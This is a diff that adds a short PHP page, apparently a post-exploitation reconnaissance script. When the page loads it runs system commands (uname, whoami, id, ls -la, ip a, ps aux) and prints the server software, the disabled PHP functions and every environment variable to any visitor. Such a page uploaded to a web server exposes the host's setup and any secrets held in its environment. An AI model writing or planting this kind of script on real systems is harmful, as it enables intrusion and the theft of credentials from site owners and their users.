@@ -1,0 +1,49 @@
+<?php
+echo "<h1>📋 System Information</h1><pre>";
+
+// OS and system details
+echo "[*] OS Information:\n";
+system("uname -a");
+
+// Current user
+echo "\n[*] Current User:\n";
+system("whoami");
+
+// User ID and groups
+echo "\n[*] User ID & Groups:\n";
+system("id");
+
+// Server software details
+echo "\n[*] Server Software:\n";
+echo $_SERVER['SERVER_SOFTWARE'] . "\n";
+
+// PHP version
+echo "\n[*] PHP Version:\n";
+echo phpversion() . "\n";
+
+// Disabled functions
+echo "\n[*] Disabled PHP Functions:\n";
+echo ini_get('disable_functions') . "\n";
+
+// Current working directory
+echo "\n[*] Current Working Directory:\n";
+echo getcwd() . "\n";
+
+// Files in current directory
+echo "\n[*] Files in Current Directory:\n";
+system("ls -la");
+
+// Environment variables
+echo "\n[*] Environment Variables:\n";
+print_r($_ENV);
+
+// Network interfaces (Linux only)
+echo "\n[*] Network Interfaces:\n";
+system("ip a || ifconfig");
+
+// Running processes
+echo "\n[*] Running Processes:\n";
+system("ps aux");
+
+echo "</pre>";
+?>
